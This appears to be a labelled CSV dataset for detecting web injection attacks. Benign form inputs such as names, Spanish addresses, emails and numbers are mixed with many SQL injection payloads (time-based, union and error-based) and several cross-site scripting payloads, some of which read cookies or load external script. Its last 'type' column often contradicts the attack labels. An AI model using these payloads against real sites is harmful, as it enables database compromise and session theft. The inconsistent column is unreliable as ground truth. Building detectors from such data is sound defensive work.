Text,attack_type,Label,type
raing,norm,0,normal
37905890g,norm,0,normal
a55r4e1a,norm,0,normal
lorletha,norm,0,normal
balcol vizcano,norm,0,normal
urea bernat,norm,0,normal
"1')) as qwdh where 7581=7581 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
mala.kuenneke@convention.sk,norm,0,normal
3596949565075836,norm,0,normal
descarada,norm,0,normal
calle gurugu 142 4?d,norm,0,normal
median2l,norm,0,normal
hanspete,norm,0,normal
49830,norm,0,normal
imogen1,norm,0,normal
"1%"") or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
hurcal-overa,norm,0,normal
guindo vive,norm,0,normal
des81ra92,norm,0,normal
massimil,norm,0,normal
width:1px;filter:glow onfilterchange=alert(1)>x</div>,xss,2,sql
"1) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (8929=8929",sqli,1,normal
522lta,norm,0,normal
ralina,norm,0,normal
adam calao,norm,0,normal
8231060336250168,norm,0,normal
8787472125390389,norm,0,normal
"calle cruz de caravaca, 171,",norm,0,normal
masegosa,norm,0,normal
"1) where 9829=9829 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
cubia cajahuanca,norm,0,normal
68035116n,norm,0,normal
"1') as ghks where 5128=5128 union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,sql
"1'||(select 'scwx' where 6591=6591 and 3824=benchmark(5000000,md5(0x76555642)))||'",sqli,1,sql
2368,norm,0,normal
5205292790214964,norm,0,normal
siana,norm,0,normal
10410049l,norm,0,normal
3080899681918174,norm,0,normal
1%' waitfor delay '0:0:5'--,sqli,1,sql
"1"" or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ""ymwb""=""ymwb",sqli,1,sql
9687551942893066,norm,0,normal
"1"")) as xhat where 6674=6674 union all select null,null,null#",sqli,1,sql
rached,norm,0,normal
gorfine,norm,0,normal
"1"")) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((""pebw"" like ""pebw",sqli,1,sql
keast@comodepilarse.si,norm,0,normal
48128,norm,0,normal
1))) waitfor delay '0:0:5' and (((3481=3481,sqli,1,normal
49123,norm,0,normal
9548,norm,0,normal
"<object type=""text/x-scriptlet"" data=""http://ha.ckers.org/scriptlet.html""></object>",xss,2,normal
cecil.wolcott7@librodeapuntes.sv,norm,0,normal
escamilla,norm,0,normal
holder,norm,0,normal
37541,norm,0,normal
educativa,norm,0,normal
"-7971)) as armw where 9474=9474 or make_set(9354=9354,7185)--",sqli,1,sql
"1"" or elt(6272=6272,sleep(5)) and ""hvic"" like ""hvic",sqli,1,normal
jeremy6,norm,0,normal
"1"")) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ((""rurz""=""rurz",sqli,1,normal
"1' in boolean mode) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
rez,norm,0,normal
1' or 6793=(select 6793 from pg_sleep(5)) and 'ukoc' like 'ukoc,sqli,1,sql
4302979715945309,norm,0,normal
2039960928892251,norm,0,normal
regalbuto@apuestatealgo.nr,norm,0,normal
"<img src=javascript:alert(""crosssitescripting"")>"";' >",xss,2,xss
-1711) where 9098=9098 order by 1#,sqli,1,normal
"-1<style>.crosssitescripting{background-image:url(""javascript:document.cookie=true"");}</style><a class=crosssitescripting></a>",xss,2,xss
"c/ espigo, 0 10h",norm,0,normal
"1)) as vrev where 4248=4248 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--",sqli,1,sql
cimorro,norm,0,normal
42223,norm,0,normal
"1')) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('ijyi'='ijyi",sqli,1,sql
65165479q,norm,0,normal
1%') rlike sleep(5) and ('%'=',sqli,1,normal
"pasaje magistrado salvador barbera 136,",norm,0,normal
"1)) as aeat where 1007=1007 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
12186635q,norm,0,normal
-4904') as ogyu where 2821=2821 or 5982=1643,sqli,1,normal
1')) as jtmf where 3937=3937;select case when 7717=7717 then 1 else null end--,sqli,1,sql
9270844246904218,norm,0,normal
"-1947 union all select 7780,7780,7780,7780,7780,7780,7780,7780#",sqli,1,sql
1343797430011078,norm,0,normal
hibbert.bupp@hojadecalculo.com.mil,norm,0,normal
borbn bascomta,norm,0,normal
"1"") where 6128=6128 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--",sqli,1,sql
45510,norm,0,normal
6262014386687000,norm,0,normal
3981394476898730,norm,0,normal
32411,norm,0,normal
farran ferragut,norm,0,normal
58772485x,norm,0,normal
pladeval berganciano,norm,0,normal
laurinda,norm,0,normal
"-7749"" or (2689=7481)*7481",sqli,1,normal
"-4984%""))) union all select 6980,6980,6980,6980,6980,6980,6980,6980#",sqli,1,sql
nithsdale.livanov@blanquillos.mo,norm,0,normal
1' and 6969=(select 6969 from pg_sleep(5)) and 'zoin'='zoin,sqli,1,sql
"1'||(select 'cjwx' from dual where 7637=7637 and elt(9548=3991,3991))||'",sqli,1,sql
"1%' union all select null,null,null#",sqli,1,sql
con79lecimie91o,norm,0,normal
50248210h,norm,0,normal
86913775h,norm,0,normal
"c/ cornudella del montsant 142, 5?b",norm,0,normal
"1"") where 9545=9545 and 9198=9198--",sqli,1,sql
"1);select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (1491=1491",sqli,1,sql
"1)));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
sprouse,norm,0,normal
monzon pinart,norm,0,normal
"1') as fksm where 9714=9714;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
1 and 8594=(select 8594 from pg_sleep(5))--,sqli,1,sql
86613661p,norm,0,normal
pblica,norm,0,normal
espinosa de cerrato,norm,0,normal
1) and 4595=4595#,sqli,1,normal
"-5292') union all select 1439,1439,1439,1439#",sqli,1,sql
lafleur,norm,0,normal
"c/ santisimo cristo del amor, 186,",norm,0,normal
"1"") where 3445=3445 and elt(1212=1254,1254)--",sqli,1,sql
"1'||(select 'jpso' from dual where 9357=9357 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))))||'",sqli,1,sql
1%');select (case when (3773=3722) then 3773 else 3773*(select 3773 from mysql.db) end)#,sqli,1,sql
otvar,norm,0,normal
1')));waitfor delay '0:0:5' and ((('ywnm'='ywnm,sqli,1,sql
"-7008')) union all select 9080,9080,9080#",sqli,1,sql
"1 where 4448=4448 union all select null,null,null,null,null#",sqli,1,sql
"1%')) union all select null,null,null,null,null,null,null,null,null,null--",sqli,1,sql
1'))) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('pneh' like 'pneh,sqli,1,sql
"1'));select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
hermindo,norm,0,normal
"1"")) and 7656=5604 and ((""zuhv""=""zuhv",sqli,1,normal
matheson4,norm,0,normal
"1') as zxho where 5907=5907 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
hine7,norm,0,normal
guarda_sol,norm,0,normal
"1;select benchmark(5000000,md5(0x4c4d6142))",sqli,1,sql
"1%') union all select null,null,null#",sqli,1,sql
4780723426433072,norm,0,normal
aana,norm,0,normal
"1"";create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
juglandea,norm,0,normal
-8004%') or (2301=7504)*7504 and ('%'=',sqli,1,normal
schwuchow9@viajessolomujeres.bj,norm,0,normal
"1 where 9869=9869 union all select null,null#",sqli,1,sql
"1"")) rlike (select (case when (8179=1246) then 1 else 0x28 end)) and ((""xxeu""=""xxeu",sqli,1,sql
21184515c,norm,0,normal
50491,norm,0,normal
"1')) or 8466=benchmark(5000000,md5(0x694a4745)) and (('jfwt' like 'jfwt",sqli,1,normal
3118,norm,0,normal
26329,norm,0,normal
"tebete, s/n, 8?d",norm,0,normal
"1);call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (8503=8503",sqli,1,sql
beterette estruga,norm,0,normal
"1"") where 3084=3084 union all select null,null--",sqli,1,sql
"1'||(select 'aair' where 9234=9234 union all select null,null,null,null#",sqli,1,sql
massa@noviasteresapalacios.mg,norm,0,normal
longo@elbauldelosrefranes.web,norm,0,normal
castejn de tornos,norm,0,normal
limburg@estoespresto.cd,norm,0,normal
03814,norm,0,normal
vargas bentos,norm,0,normal
09640,norm,0,normal
1) as eryo where 2531=2531 rlike sleep(5)--,sqli,1,sql
2282507276163108,norm,0,normal
fedor,norm,0,normal
6537476325760255,norm,0,normal
de las muecas pedrol,norm,0,normal
z4rce7a,norm,0,normal
"-9672')) as rupb where 8218=8218 or make_set(4954=1836,1836)--",sqli,1,sql
20s6a8or,norm,0,normal
"1%""))) and 8438=7620--",sqli,1,sql
"1) as tgqd where 6369=6369 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,1,sql
45571,norm,0,normal
"1' (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and 'efpc' like 'efpc",sqli,1,sql
"-7036%' or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and '%'='",sqli,1,sql
"<img """"""><script>alert(""crosssitescripting"")</script>"">",xss,2,xss
1)));begin dbms_lock.sleep(5); end and (((4675=4675,sqli,1,sql
23593437z,norm,0,normal
"1)) as jzzo where 7773=7773 union all select null,null,null,null,null#",sqli,1,sql
19327,norm,0,normal
"1')) as dipp where 1714=1714;select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
"1) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
carteado,norm,0,normal
"1"");select pg_sleep(5) and (""tpry""=""tpry",sqli,1,sql
42146,norm,0,normal
zoratti,norm,0,normal
11520,norm,0,normal
madrigalesco,norm,0,normal
roda deita,norm,0,normal
bruzzese@audiosat.ar,norm,0,normal
lenya@fbi-criminal-network.com.mil,norm,0,normal
89388462c,norm,0,normal
1'));select pg_sleep(5) and (('vxxg'='vxxg,sqli,1,sql
forbes,norm,0,normal
c/ domingo bello espinosa 138,norm,0,normal
"-8929%') union all select 9486,9486,9486,9486#",sqli,1,sql
dunik,norm,0,normal
211,norm,0,normal
hemisfero,norm,0,normal
jo-allen@engibraltar.zr,norm,0,normal
alert(1)><input autofocus>,xss,2,normal
ying-chieh0@etnics.mn,norm,0,normal
poveda,norm,0,normal
"carrer pompeu fabra, 151,",norm,0,normal
"1) where 6472=6472;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",sqli,1,sql
7659332695027336,norm,0,normal
mentecapta,norm,0,normal
irresolucin,norm,0,normal
"1"")) as knyf where 8109=8109 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
alio,norm,0,normal
cavia alberola,norm,0,normal
laguna del marquesado,norm,0,normal
peso de la harina 174,norm,0,normal
"1%""))) union all select null,null,null,null,null#",sqli,1,sql
legarza gambin,norm,0,normal
"1' union all select null,null,null,null,null,null--",sqli,1,sql
traveria morera,norm,0,normal
5563798964634481,norm,0,normal
37607,norm,0,normal
paisaje,norm,0,normal
"1""))) or elt(6272=6272,sleep(5)) and (((""hxgu""=""hxgu",sqli,1,normal
1) as azoo where 8933=8933 and (3020=3020)*6703--,sqli,1,sql
1' in boolean mode);select pg_sleep(5)--,sqli,1,sql
ti20,norm,0,normal
carmia,norm,0,normal
05208723m,norm,0,normal
0058041048086449,norm,0,normal
"1',(select (case when (3888=3888) then (select count(*) from generate_series(1,5000000)) else 1/(select 0) end))",sqli,1,sql
james,norm,0,normal
"torrent de can caralleu 48, 12-g",norm,0,normal
22446221s,norm,0,normal
"1)(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))",sqli,1,sql
"1%"" and make_set(2905=5725,5725) and ""%""=""",sqli,1,normal
queila,norm,0,normal
threader,norm,0,normal
29887757q,norm,0,normal
basile@europop.by,norm,0,normal
"1%"")));select pg_sleep(5) and (((""%""=""",sqli,1,sql
"<a href=""javascript:document.location='http://www.vulnerability-lab.com/'"">crosssitescripting</a>",xss,2,xss
kosanovic@discon.cg,norm,0,normal
-4896') union all select 1929--,sqli,1,sql
0562626230095582,norm,0,normal
saviange_files@zytel.nc,norm,0,normal
chatterji@skullride.sj,norm,0,normal
ribadesella,norm,0,normal
aflechate,norm,0,normal
9708629316850824,norm,0,normal
09191,norm,0,normal
frontera,norm,0,normal
saia,norm,0,normal
vellora,norm,0,normal
1') rlike sleep(5) and ('boto'='boto,sqli,1,normal
romeralo pers,norm,0,normal
"<xml src=""crosssitescriptingtest.xml"" id=i></xml><span datasrc=#i datafld=c dataformatas=html></span>",xss,2,normal
6703,norm,0,normal
-2869')) union all select 3216--,sqli,1,sql
villodrigo,norm,0,normal
"1'+(select 'mgrj' where 8514=8514 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x))+'",sqli,1,sql
23280,norm,0,normal
"1""))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((""djrh""=""djrh",sqli,1,sql
0893945403405745,norm,0,normal
"calle costa brava, 148,",norm,0,normal
"1'+(select 'rpbx' where 6748=6748 and elt(4249=4249,7259))+'",sqli,1,sql
"1"")) as nsbu where 6569=6569 or sleep(5)#",sqli,1,normal
trish,norm,0,normal
monti,norm,0,normal
"comun 150,",norm,0,normal
"1' where 7464=7464 and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1,normal
"1' where 5230=5230;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
aleandro-hayman@tecnoindomo.nr,norm,0,normal
23763353y,norm,0,normal
91257210h,norm,0,normal
voluble,norm,0,normal
31,norm,0,normal
potel ivars,norm,0,normal
6501,norm,0,normal
"-8929' union all select 5324,5324,5324,5324,5324,5324--",sqli,1,sql
"1))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (((9255=9255",sqli,1,sql
7362218101347433,norm,0,normal
"c/ encajeras, 40 4?f",norm,0,normal
"-1<xml id=i><x><c><![cdata[<img src=""javas]]<![cdata[cript:document.cookie=true;"">]]</c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>",xss,2,sql
collazos de boedo,norm,0,normal
-2505' or 9323=9323#,sqli,1,normal
"1')) or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
"-3954')) union all select 2417,2417--",sqli,1,sql
"1"")) union all select null,null,null,null,null,null,null,null--",sqli,1,sql
griffy,norm,0,normal
1) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (1073=1073,sqli,1,sql
45182,norm,0,normal
husky_hurlic@ropadegolf.sn,norm,0,normal
berrocal,norm,0,normal
9047664799943774,norm,0,normal
timm,norm,0,normal
6657,norm,0,normal
"1%"")) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((""%""=""",sqli,1,sql
richey,norm,0,normal
"1%""))) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (((""%""=""",sqli,1,sql
"1) where 7815=7815 union all select null,null,null,null,null,null,null#",sqli,1,sql
woodwood5@rosaserigrafia.cc,norm,0,normal
convento de las dueas 86,norm,0,normal
29283698y,norm,0,normal
3123820484071721,norm,0,normal
00474767r,norm,0,normal
"1"") rlike sleep(5) and (""rfsd""=""rfsd",sqli,1,normal
"-2916"")) or 4946=8232--",sqli,1,sql
10182,norm,0,normal
06690,norm,0,normal
"1""));select sleep(5)#",sqli,1,sql
ciclotimia,norm,0,normal
c/ emile robin 194 9?h,norm,0,normal
dodsworth@sevach.co,norm,0,normal
09560,norm,0,normal
1) where 8041=8041;select (case when (5970=2200) then 1 else 5970*(select 5970 from master..sysdatabases) end)--,sqli,1,sql
2er7n9um43a,norm,0,normal
7751,norm,0,normal
1438,norm,0,normal
c/ marroquina 16 10?c,norm,0,normal
andras,norm,0,normal
1') and 6969=(select 6969 from pg_sleep(5)) and ('ifvz' like 'ifvz,sqli,1,sql
lacivo,norm,0,normal
"1'))) and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1,normal
bau pelayo,norm,0,normal
68623074k,norm,0,normal
"1%""))) union all select null,null,null,null,null,null,null#",sqli,1,sql
olivares,norm,0,normal
-2411%'))) or 6872=6872 and ((('%'=',sqli,1,normal
"<a href=""javascript#document.cookie=true;"">",xss,2,sql
"1,(select (case when (8640=8640) then (ascii(regexp_substring(repeat(right(char(8640),0),500000000),null))) else 8640/(select 0 from information_schema.system_users) end) from information_schema.system_users)--",sqli,1,sql
agostina,norm,0,normal
"1) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (3814=3814",sqli,1,sql
emblanquimiento,norm,0,normal
medina del campo,norm,0,normal
"1')));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((('ojkd'='ojkd",sqli,1,sql
93494708f,norm,0,normal
anunciador,norm,0,normal
"1%') and 3824=benchmark(5000000,md5(0x76555642)) and ('%'='",sqli,1,normal
av. regulares 130 1c,norm,0,normal
ganzel@wdsl.tr,norm,0,normal
arnold,norm,0,normal
9683,norm,0,normal
evarist arnus 5 11-d,norm,0,normal
"1' where 8360=8360 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1,sql
"<video onerror=""javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))""><source>",xss,2,xss
"1) union all select null,null,null,null,null#",sqli,1,sql
95642019s,norm,0,normal
beiza ivanco,norm,0,normal
rudie@deuxmanagement.jo,norm,0,normal
"1"")) as dksq where 7161=7161;iif(5257=5257,1,1/0)",sqli,1,sql
fo9nece9,norm,0,normal
"-3781%') union all select 7497,7497,7497,7497,7497--",sqli,1,sql
d66jador,norm,0,normal
visionario,norm,0,normal
"1';select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual",sqli,1,sql
canto,norm,0,normal
3313243213262173,norm,0,normal
"1""));select sleep(5) and ((""vzye""=""vzye",sqli,1,sql
1 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))-- icxn,sqli,1,sql
5933,norm,0,normal
fontihoyuelo,norm,0,normal
sandrock,norm,0,normal
1)) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ((4279=4279,sqli,1,sql
63102165d,norm,0,normal
benson-rabasa@mareventsprotocolosocial.ad,norm,0,normal
26340,norm,0,normal
magruder@pisossantcugat.ph,norm,0,normal
jeshua,norm,0,normal
es2eri5o,norm,0,normal
"1%"")) union all select null,null,null#",sqli,1,sql
desencorvar,norm,0,normal
meleskie,norm,0,normal
"1%""))) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
rascel-byatt@discotecateatre.ug,norm,0,normal
6470509098489788,norm,0,normal
39419,norm,0,normal
"1"") and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (""jfgk"" like ""jfgk",sqli,1,sql
6$ng4tado,norm,0,normal
follosas,norm,0,normal
5849964117227978,norm,0,normal
berberisco,norm,0,normal
elantxobe,norm,0,normal
"-2864') or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('vjbl'='vjbl",sqli,1,sql
-1386') or (7880=5362)*5362 and ('vsyu' like 'vsyu,sqli,1,normal
25320,norm,0,normal
iranzo,norm,0,normal
"paseo rey, 167 8-f",norm,0,normal
gattas,norm,0,normal
5425,norm,0,normal
"1%"" or elt(6272=6272,sleep(5)) and ""%""=""",sqli,1,normal
-4351') or 6525=9458,sqli,1,normal
"calle biznaga, 5",norm,0,normal
1) where 8433=8433 rlike (select (case when (7689=7689) then 1 else 0x28 end))--,sqli,1,sql
"-6334') union all select 3738,3738,3738,3738,3738,3738,3738,3738--",sqli,1,sql
5825253039721313,norm,0,normal
43895,norm,0,normal
r09p8tuo49m+en2e,norm,0,normal
crichton,norm,0,normal
7994,norm,0,normal
b5rr1mbada,norm,0,normal
"1"")) as itxo where 7916=7916;select count(*) from generate_series(1,5000000)--",sqli,1,sql
"calle sant pau, 117,",norm,0,normal
"1%"") rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (""%""=""",sqli,1,sql
"glorieta antonio molina 87,",norm,0,normal
pruja lantadilla,norm,0,normal
-1879%')) or 3038=3038,sqli,1,normal
8911,norm,0,normal
"c/ carranque, 113 5?a",norm,0,normal
"1"" where 8635=8635 and 4595=4595#",sqli,1,normal
"1'+(select hspl where 4530=4530 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
pedro muoz,norm,0,normal
"<xml id=xss src=""xsstest.xml"" id=i></xml><span dataid=xss src=#i datafld=c dataformatas=html></span>",xss,2,normal
1' in boolean mode);begin user_lock.sleep(5); end#,sqli,1,sql
pozaldez,norm,0,normal
fnico,norm,0,normal
villarejo del valle,norm,0,normal
agoz0086,norm,0,normal
le8ru41,norm,0,normal
"cami sant cugat al papiol 59,",norm,0,normal
1'||(select 'hafu' where 6226=6226;(select * from (select(sleep(5)))srmq))||',sqli,1,sql
49280,norm,0,normal
"1%')) union all select null,null,null,null,null,null,null#",sqli,1,sql
calle san juan 151 1e,norm,0,normal
"calle astro s/n,",norm,0,normal
-7279) or 9898=9963 and (1481=1481,sqli,1,normal
7149449459754030,norm,0,normal
0466431001368094,norm,0,normal
hoya-gonzalo,norm,0,normal
caizal,norm,0,normal
5713340032825247,norm,0,normal
torterolo buix,norm,0,normal
niemyska@inversioneolica.lt,norm,0,normal
50629,norm,0,normal
"calle jose espejo, 130, 12?a",norm,0,normal
"1) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",sqli,1,sql
"carrer nostra sra del pilar, 101",norm,0,normal
mompel urdi,norm,0,normal
kipp,norm,0,normal
clrici panella,norm,0,normal
2745,norm,0,normal
inquisicin,norm,0,normal
"-7139"") where 2723=2723 or 3900=5082--",sqli,1,sql
c0m51ar,norm,0,normal
53r$retar,norm,0,normal
"1'));select benchmark(5000000,md5(0x4c4d6142)) and (('nczi'='nczi",sqli,1,sql
19277401c,norm,0,normal
"1"";(select * from (select(sleep(5)))srmq) and ""wsmz"" like ""wsmz",sqli,1,sql
rasmia,norm,0,normal
1721278325772936,norm,0,normal
"1 where 7802=7802;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
berenice,norm,0,normal
1717836675629432,norm,0,normal
"1%') and elt(1210=1210,sleep(5)) and ('%'='",sqli,1,normal
"c/ manuel altolaguirre, 62",norm,0,normal
hinchey,norm,0,normal
nicova8@necesitocurro.kg,norm,0,normal
sari7,norm,0,normal
07194416q,norm,0,normal
rosalinda,norm,0,normal
1)) as msug where 3503=3503 and sleep(5)#,sqli,1,normal
paniego oliva,norm,0,normal
"carrer asturies, 49",norm,0,normal
narella,norm,0,normal
"make_set(6174=9734,1)",sqli,1,normal
51egible,norm,0,normal
"1) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))",sqli,1,sql
mckibbon,norm,0,normal
19223,norm,0,normal
verdugo olalla,norm,0,normal
"c/ orion, 10,",norm,0,normal
1' and sleep(5) and 'usgv' like 'usgv,sqli,1,normal
"-4972')) as kfzc where 8817=8817 union all select 8817,8817,8817,8817,8817,8817--",sqli,1,sql
calle soria 154 2a,norm,0,normal
<script>alert('xssya')</script>,xss,2,xss
"-7069) union all select 6638,6638,6638,6638,6638,6638--",sqli,1,sql
7u4o84z1m07459,norm,0,normal
janti.quillan@messadivoce.tw,norm,0,normal
"1%') and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
clodomiro,norm,0,normal
oliva,norm,0,normal
c6nte9osa,norm,0,normal
afoscarse,norm,0,normal
<iframe src=http://test.de>,xss,2,normal
-9564 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual),sqli,1,sql
36101272n,norm,0,normal
panter,norm,0,normal
"-3758')) union all select 9460,9460,9460,9460,9460,9460,9460,9460--",sqli,1,sql
-5742' where 1314=1314 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--,sqli,1,sql
burgos,norm,0,normal
alberta,norm,0,normal
amayuela romay,norm,0,normal
shina,norm,0,normal
sar2384g0,norm,0,normal
noem,norm,0,normal
6449111559125327,norm,0,normal
64733615t,norm,0,normal
amalio,norm,0,normal
94534158h,norm,0,normal
"1'))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (('rnyb'='rnyb",sqli,1,sql
4780011651843487,norm,0,normal
"1) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1,sql
4857,norm,0,normal
fabrizzio,norm,0,normal
"1' where 4417=4417 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",sqli,1,sql
"1"") where 7914=7914 rlike (select * from (select(sleep(5)))vwyq)#",sqli,1,sql
rabanera,norm,0,normal
0592934033194730,norm,0,normal
8679,norm,0,normal
a corua,norm,0,normal
"<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(""crosssitescripting"")>",xss,2,sql
